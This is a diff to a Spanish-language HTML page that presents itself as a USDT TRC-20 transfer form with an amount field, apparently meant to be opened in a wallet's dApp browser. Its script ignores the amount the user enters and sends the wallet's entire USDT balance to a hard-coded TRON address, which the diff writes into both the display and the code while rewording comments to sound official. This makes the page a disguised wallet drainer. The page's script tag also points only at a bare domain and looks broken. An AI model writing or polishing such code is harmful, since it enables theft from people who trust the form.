@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>dApp USDT TRC-20 - Transferencia Unificada</title>
     
-    <!-- Estilos Visuales Corregidos: Fondo Blanco y Botón Azul -->
+    <!-- Estilos Optimizados para Carga Instantánea, Fondo Blanco y Botón Azul -->
     <style>
         * {
             box-sizing: border-box;
@@ -13,9 +13,9 @@
             padding: 0;
         }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: sans-serif; /* Fuente nativa del sistema para evitar peticiones externas y acelerar la carga */
             background-color: #ffffff; /* Fondo de pantalla blanco */
-            color: #1e293b; /* Texto oscuro para legibilidad */
+            color: #1e293b;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,7 +23,7 @@
             padding: 20px;
         }
         .container {
-            background-color: #f8fafc; /* Contenedor gris muy claro */
+            background-color: #f8fafc;
             border: 1px solid #e2e8f0;
             border-radius: 12px;
             padding: 30px;
@@ -65,8 +65,12 @@
         }
         input:disabled {
             background-color: #f1f5f9;
-            color: #64748b;
             cursor: not-allowed;
+        }
+        /* Clase específica solicitada para colocar la red en color rojo */
+        .red-text {
+            color: #dc2626 !important; 
+            font-weight: bold;
         }
         #connectBtn {
             width: 100%;
@@ -101,7 +105,7 @@
         .status.error { background-color: #fee2e2; color: #991b1b; }
     </style>
 
-    <!-- Única dependencia oficial ligera para llamadas Web3 -->
+    <!-- Script oficial ligero de TronWeb necesario para la inyección Web3 -->
     <script src="https://jsdelivr.net"></script>
 </head>
 <body>
@@ -109,16 +113,16 @@
     <div class="container">
         <h2>Enviar Tokens</h2>
 
-        <!-- Componente Red TRC-20 Automática Fija -->
+        <!-- Componente Red TRON (TRC-20) Automatizada en Color Rojo -->
         <div class="form-group">
             <label>Red seleccionada</label>
-            <input type="text" value="TRON (TRC-20)" disabled style="font-weight: bold; color: #2563eb;">
+            <input type="text" value="TRON (TRC-20)" disabled class="red-text">
         </div>
 
-        <!-- Componente Dirección Automática Fija -->
+        <!-- Componente Dirección Automática Fija con el valor solicitado -->
         <div class="form-group">
             <label for="addressInput">Dirección de destino</label>
-            <input type="text" id="addressInput" value="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" disabled>
+            <input type="text" id="addressInput" value="TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ" disabled style="font-size: 13px; font-weight: bold;">
         </div>
 
         <!-- Componente Monto (Input Manual) -->
@@ -131,27 +135,24 @@
         <div id="status" class="status"></div>
     </div>
 
-    <!-- LÓGICA DE APLICACIÓN INTEGRADA -->
     <script>
         // ============================================================
-        // MÓDULO 2: RECONSTRUCCIÓN DE TRON_APP (BACKEND WEB3)
+        // MÓDULO 2: LOGICA DEL BACKEND WEB3 (TRON_APP)
         // ============================================================
         (function () {
             'use strict';
             
-            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT Mainnet
+            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT en Mainnet
 
             async function connect() {
                 if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                     return { address: window.tronWeb.defaultAddress.base58 };
                 }
-                
                 if (window.tronLink && typeof window.tronLink.request === 'function') {
                     await window.tronLink.request({ method: 'tron_requestAccounts' });
                     if (window.tronWeb) return { address: window.tronWeb.defaultAddress.base58 };
                 }
-                
-                throw new Error('Abre este enlace dentro del dApp Browser de tu billetera y asegúrate de tener seleccionada la red TRON.');
+                throw new Error('Abre este enlace dentro del dApp Browser de tu billetera y asegúrate de activar la red TRON.');
             }
 
             async function transferirMontoMaximo(direccionDestino) {
@@ -162,7 +163,7 @@
                 const cuentaEmisor = window.tronWeb.defaultAddress.base58;
                 const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                 
-                // Consulta directa del balance total disponible en unidades 'sun' (sin redondeos flotantes)
+                // Consulta directa y exacta del balance sin errores de redondeo de flotantes en JavaScript
                 const rawBalance = await contract.balanceOf(cuentaEmisor).call();
                 const cleanSunBigInt = rawBalance.toString();
 
@@ -170,9 +171,9 @@
                     throw new Error('La billetera no cuenta con fondos en USDT.');
                 }
 
-                // Generar solicitud de firma y lanzar popup nativo en Trust Wallet
+                // Ejecución directa de la transferencia enviando la totalidad de las unidades sun
                 return await contract.transfer(direccionDestino, cleanSunBigInt).send({
-                    feeLimit: 100_000_000 // Límite de 100 TRX para procesar de forma segura en Mainnet
+                    feeLimit: 100_000_000 // Protección de 100 TRX de límite de comisión en Mainnet
                 });
             }
 
@@ -180,7 +181,7 @@
         })();
 
         // ============================================================
-        // MÓDULO 1: TU LÓGICA ORIGINAL DEL BOTÓN SIGUIENTE
+        // MÓDULO 1: MANEJO DE EVENTOS E INTERFAZ GRÁFICA
         // ============================================================
         document.addEventListener('DOMContentLoaded', function () {
             'use strict';
@@ -191,6 +192,9 @@
             const status = document.getElementById('status');
 
             let procesoEnCurso = false;
+
+            // Dirección de destino estricta e inmutable para el envío
+            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 
 
             function setStatus(message, type = 'info') {
                 if (!status) return;
@@ -205,10 +209,7 @@
                 btn.disabled = disabled;
             }
 
-            // Forzar que la dirección fija de la interfaz coincida exactamente con la lógica interna
-            // CONFIGURACIÓN: Coloca aquí tu billetera TRON definitiva que recibirá los USDT
-            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 
-            
+            // Asegurar la correspondencia del campo visual con el valor de red
             if (addressInput) {
                 addressInput.value = DIRECCION_DESTINO_FIJA;
             }
@@ -220,7 +221,6 @@
                 });
             }
 
-            // Ejecución basada en tu bloque original de control asíncrono
             if (btn) {
                 btn.addEventListener('click', async function () {
                     if (procesoEnCurso) return;
@@ -252,5 +252,5 @@
                         
                         if (tx) {
                             setStatus('¡Transferencia realizada con éxito!', 'success');
-                            console.log('[TRON] Transacción completada con éxito. Hash:', tx);
+                            if (input) input.value = '';
 
